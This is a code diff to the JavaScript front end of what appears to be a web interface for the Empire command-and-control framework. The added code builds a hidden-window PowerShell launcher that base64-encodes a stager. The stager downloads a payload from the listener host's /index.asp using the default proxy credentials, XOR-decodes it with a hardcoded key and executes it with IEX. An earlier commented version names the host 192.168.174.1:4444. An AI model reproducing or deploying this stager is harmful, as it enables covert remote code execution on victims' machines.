@@ -1,4 +1,28 @@
 
+// powershell is stupid - encoding to UTF-16LE
+// https://stackoverflow.com/questions/24379446/utf-8-to-utf-16le-javascript
+// https://stackoverflow.com/questions/37596748/how-do-i-encode-a-javascript-string-in-utf-16
+// https://stackoverflow.com/questions/6965107/converting-between-strings-and-arraybuffers
+// https://stackoverflow.com/questions/9267899/arraybuffer-to-base64-encoded-string
+function psEncode(text)
+{
+  var byteArray = new Uint8Array(text.length * 2);
+  for (var i = 0; i < text.length; i++)
+  {
+    byteArray[i*2] = text.charCodeAt(i) // & 0xff;
+    byteArray[i*2+1] = text.charCodeAt(i) >> 8 // & 0xff;
+  }
+
+  binary = ''; // convert to binary
+  for (var i = 0; i < byteArray.length; i++)
+  {  
+    binary += String.fromCharCode( byteArray[ i ] );
+  }
+
+  return btoa(binary);
+  // please clap..
+}
+
 var app = angular.module("empire", []);
 app.controller('main', ['$scope', function ($scope,$http)
 {
@@ -71,11 +95,11 @@ app.controller('main', ['$scope', function ($scope,$http)
     {
       console.log(listener+" is at "+host);
       $scope.currentListener=listener;
-      $scope.launcherPayload="powershell.exe -NoP -sta -NonI -W Hidden -Enc ";
-      //$scope.launcherPayload+=btoa("[SYstem.NET.SErVIcEPOinTMANAger]::EXPeCT100COntiNue = 0;$WC=NEW-OBJECt SystEM.NEt.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdeRs.ADd('User-Agent',$u);$wC.PROXy = [SYstem.NEt.WEBRequeST]::DEfaultWEbPRoXy;$wc.ProXY.CredenTIAlS = [System.Net.CREDeNTiAlCACHE]::DEfAultNeTwOrkCRedeNTIAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[CHAr[]]$B=([char[]]($WC.DOWnLoADSTRinG(\"http://192.168.174.1:4444/index.asp\")))|%{$_-BXOR$k[$i++%$K.LengTh]};IEX ($B-JoiN'')";
 
+      encoded = psEncode("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");
 
-      //$scope.launcherPayload+=btoa("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");
+      $scope.launcherPayload="powershell.exe -NoP -sta -NonI -W Hidden -Enc "+encoded;
+
       $('#launcherModal').modal('show');
     }
 
